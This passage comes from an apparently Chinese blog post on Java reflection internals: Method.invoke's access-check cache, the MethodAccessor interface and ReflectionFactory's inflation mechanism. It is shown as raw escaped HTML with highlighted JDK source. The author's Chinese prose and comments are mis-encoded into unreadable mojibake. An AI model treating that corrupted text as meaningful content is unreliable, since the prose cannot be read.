&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Class&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">lt&lt;/span>&lt;span class="o">;?&amp;amp;&lt;/span>&lt;span class="n">gt&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="n">targetClass&lt;/span>&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">throws&lt;/span> &lt;span class="n">IllegalAccessException&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Reflection&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">ensureMemberAccess&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">caller&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">clazz&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">obj&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">modifiers&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Success: Update the cache.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">Object&lt;/span> &lt;span class="n">cache&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">((&lt;/span>&lt;span class="n">targetClass&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">clazz&lt;/span>&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">?&lt;/span> &lt;span class="n">caller&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">:&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">Class&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">lt&lt;/span>&lt;span class="o">;?&amp;amp;&lt;/span>&lt;span class="n">gt&lt;/span>&lt;span class="o">;[]&lt;/span> &lt;span class="o">{&lt;/span> &lt;span class="n">caller&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">targetClass&lt;/span> &lt;span class="o">});&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Note: The two cache elements are not volatile,
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// but they are effectively final. The Java memory model
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// guarantees that the initializing stores for the cache
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// elements will occur before the volatile write.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">securityCheckCache&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">cache&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="c1">// write volatile
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ç”¨Reflection.ensureMemberAccessæ–¹æ³•ç»§ç»­æ£€æŸ¥æƒé™ï¼Œè‹¥æ£€æŸ¥é€šè¿‡å°±æ›´æ–°ç¼“å­˜ï¼Œè¿™æ ·ä¸‹ä¸€æ¬¡åŒä¸€ä¸ªç±»è°ƒç”¨åŒä¸€ä¸ªæ–¹æ³•æ—¶å°±ä¸ç”¨æ‰§è¡Œæƒé™æ£€æŸ¥äº†ï¼Œè¿™æ˜¯ä¸€ç§ç®€å•çš„ç¼“å­˜æœºåˆ¶ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>è°ƒç”¨MethodAccessorçš„invokeæ–¹æ³•&lt;/p>
&lt;p>ç”±sun.reflect.MethodAccessor å¤„ç†&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="cm">/** This interface provides the declaration for
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> java.lang.reflect.Method.invoke(). Each Method object is
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> configured with a (possibly dynamically-generated) class which
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> implements this interface.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kd">interface&lt;/span> &lt;span class="nc">MethodAccessor&lt;/span> &lt;span class="o">{&lt;/span> &lt;span class="c1">//æ˜¯ä¸€ä¸ªæ¥å£
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="cm">/** Matches specification in {@link java.lang.reflect.Method} */&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="n">Object&lt;/span> &lt;span class="nf">invoke&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">Object&lt;/span> &lt;span class="n">obj&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">Object&lt;/span>&lt;span class="o">[]&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">throws&lt;/span> &lt;span class="n">IllegalArgumentException&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">InvocationTargetException&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>åˆ†æå…¶Usageå¯å¾—å®ƒçš„å…·ä½“å®ç°ç±»æœ‰:&lt;/p>
&lt;ul>
&lt;li>
&lt;p>sun.reflect.DelegatingMethodAccessorImpl&lt;/p>
&lt;/li>
&lt;li>
&lt;p>sun.reflect.MethodAccessorImpl&lt;/p>
&lt;/li>
&lt;li>
&lt;p>sun.reflect.NativeMethodAccessorImpl&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>methodAccessorå®ä¾‹ç”±reflectionFactoryå¯¹è±¡æ“æ§ç”Ÿæˆï¼Œå®ƒåœ¨AccessibleObjectä¸‹çš„å£°æ˜å¦‚ä¸‹:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// Reflection factory used by subclasses for creating field,
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// method, and constructor accessors. Note that this is called
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// very early in the bootstrapping process.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="kd">static&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="n">ReflectionFactory&lt;/span> &lt;span class="n">reflectionFactory&lt;/span> &lt;span class="o">=&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">AccessController&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">doPrivileged&lt;/span>&lt;span class="o">(&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">new&lt;/span> &lt;span class="n">sun&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">reflect&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">ReflectionFactory&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">GetReflectionFactoryAction&lt;/span>&lt;span class="o">());&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>sun.reflect.ReflectionFactoryç±»çš„æºç ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;span class="lnt">51
&lt;/span>&lt;span class="lnt">52
&lt;/span>&lt;span class="lnt">53
&lt;/span>&lt;span class="lnt">54
&lt;/span>&lt;span class="lnt">55
&lt;/span>&lt;span class="lnt">56
&lt;/span>&lt;span class="lnt">57
&lt;/span>&lt;span class="lnt">58
&lt;/span>&lt;span class="lnt">59
&lt;/span>&lt;span class="lnt">60
&lt;/span>&lt;span class="lnt">61
&lt;/span>&lt;span class="lnt">62
&lt;/span>&lt;span class="lnt">63
&lt;/span>&lt;span class="lnt">64
&lt;/span>&lt;span class="lnt">65
&lt;/span>&lt;span class="lnt">66
&lt;/span>&lt;span class="lnt">67
&lt;/span>&lt;span class="lnt">68
&lt;/span>&lt;span class="lnt">69
&lt;/span>&lt;span class="lnt">70
&lt;/span>&lt;span class="lnt">71
&lt;/span>&lt;span class="lnt">72
&lt;/span>&lt;span class="lnt">73
&lt;/span>&lt;span class="lnt">74
&lt;/span>&lt;span class="lnt">75
&lt;/span>&lt;span class="lnt">76
&lt;/span>&lt;span class="lnt">77
&lt;/span>&lt;span class="lnt">78
&lt;/span>&lt;span class="lnt">79
&lt;/span>&lt;span class="lnt">80
&lt;/span>&lt;span class="lnt">81
&lt;/span>&lt;span class="lnt">82
&lt;/span>&lt;span class="lnt">83
&lt;/span>&lt;span class="lnt">84
&lt;/span>&lt;span class="lnt">85
&lt;/span>&lt;span class="lnt">86
&lt;/span>&lt;span class="lnt">87
&lt;/span>&lt;span class="lnt">88
&lt;/span>&lt;span class="lnt">89
&lt;/span>&lt;span class="lnt">90
&lt;/span>&lt;span class="lnt">91
&lt;/span>&lt;span class="lnt">92
&lt;/span>&lt;span class="lnt">93
&lt;/span>&lt;span class="lnt">94
&lt;/span>&lt;span class="lnt">95
&lt;/span>&lt;span class="lnt">96
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">public&lt;/span> &lt;span class="kd">class&lt;/span> &lt;span class="nc">ReflectionFactory&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">private&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kt">boolean&lt;/span> &lt;span class="n">initted&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">false&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">private&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="n">Permission&lt;/span> &lt;span class="n">reflectionFactoryAccessPerm&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">RuntimePermission&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;reflectionFactoryAccess&amp;#34;&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">private&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="n">ReflectionFactory&lt;/span> &lt;span class="n">soleInstance&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">ReflectionFactory&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Provides access to package-private mechanisms in java.lang.reflect
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">private&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kd">volatile&lt;/span> &lt;span class="n">LangReflectAccess&lt;/span> &lt;span class="n">langReflectAccess&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// è¿™é‡Œè®¾è®¡å¾—éå¸¸å·§å¦™
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// &amp;#34;Inflation&amp;#34; mechanism. Loading bytecodes to implement
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// Method.invoke() and Constructor.newInstance() currently costs
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// 3-4x more than an invocation via native code for the first
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// invocation (though subsequent invocations have been benchmarked
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// to be over 20x faster). Unfortunately this cost increases
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// startup time for certain applications that use reflection
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// intensively (but only once per class) to bootstrap themselves.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// To avoid this penalty we reuse the existing JVM entry points
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// for the first few invocations of Methods and Constructors and
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// then switch to the bytecode-based implementations.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// Package-private to be accessible to NativeMethodAccessorImpl
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// and NativeConstructorAccessorImpl
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">private&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kt">boolean&lt;/span> &lt;span class="n">noInflation&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">false&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">private&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">inflationThreshold&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">15&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//......
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//è¿™æ˜¯ç”ŸæˆMethodAccessorçš„æ–¹æ³•
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">public&lt;/span> &lt;span class="n">MethodAccessor&lt;/span> &lt;span class="nf">newMethodAccessor&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">Method&lt;/span> &lt;span class="n">method&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">checkInitted&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">noInflation&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="o">!&lt;/span>&lt;span class="n">ReflectUtil&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">isVMAnonymousClass&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">method&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getDeclaringClass&lt;/span>&lt;span class="o">()))&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">MethodAccessorGenerator&lt;/span>&lt;span class="o">().&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">generateMethod&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">method&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getDeclaringClass&lt;/span>&lt;span class="o">(),&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">method&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getName&lt;/span>&lt;span class="o">(),&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">method&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getParameterTypes&lt;/span>&lt;span class="o">(),&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">method&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getReturnType&lt;/span>&lt;span class="o">(),&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">method&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getExceptionTypes&lt;/span>&lt;span class="o">(),&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">method&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getModifiers&lt;/span>&lt;span class="o">());&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">NativeMethodAccessorImpl&lt;/span> &lt;span class="n">acc&lt;/span> &lt;span class="o">=&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">new&lt;/span> &lt;span class="n">NativeMethodAccessorImpl&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">method&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">DelegatingMethodAccessorImpl&lt;/span> &lt;span class="n">res&lt;/span> &lt;span class="o">=&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">new&lt;/span> &lt;span class="n">DelegatingMethodAccessorImpl&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">acc&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">acc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">setParent&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">res&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">res&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//......
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="cm">/** We have to defer full initialization of this class until after
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> the static initializer is run since java.lang.reflect.Method&amp;#39;s
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> static initializer (more properly, that for
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> java.lang.reflect.AccessibleObject) causes this class&amp;#39;s to be
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> run, before the system properties are set up. */&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">private&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">checkInitted&lt;/span>&lt;span class="o">()&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">initted&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="k">return&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">AccessController&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">doPrivileged&lt;/span>&lt;span class="o">(&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">new&lt;/span> &lt;span class="n">PrivilegedAction&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">Void&lt;/span>&lt;span class="o">&amp;gt;()&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="n">Void&lt;/span> &lt;span class="nf">run&lt;/span>&lt;span class="o">()&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Tests to ensure the system properties table is fully
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// initialized. This is needed because reflection code is
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// called very early in the initialization process (before
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// command-line arguments have been parsed and therefore
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// these user-settable properties installed.) We assume that
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// if System.out is non-null then the System class has been
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// fully initialized and that the bulk of the startup code
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// has been run.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">System&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">out&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// java.lang.System not yet fully initialized
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">return&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">String&lt;/span> &lt;span class="n">val&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">System&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getProperty&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;sun.reflect.noInflation&amp;#34;&lt;/span>&lt;span class="o">);&lt;/span>
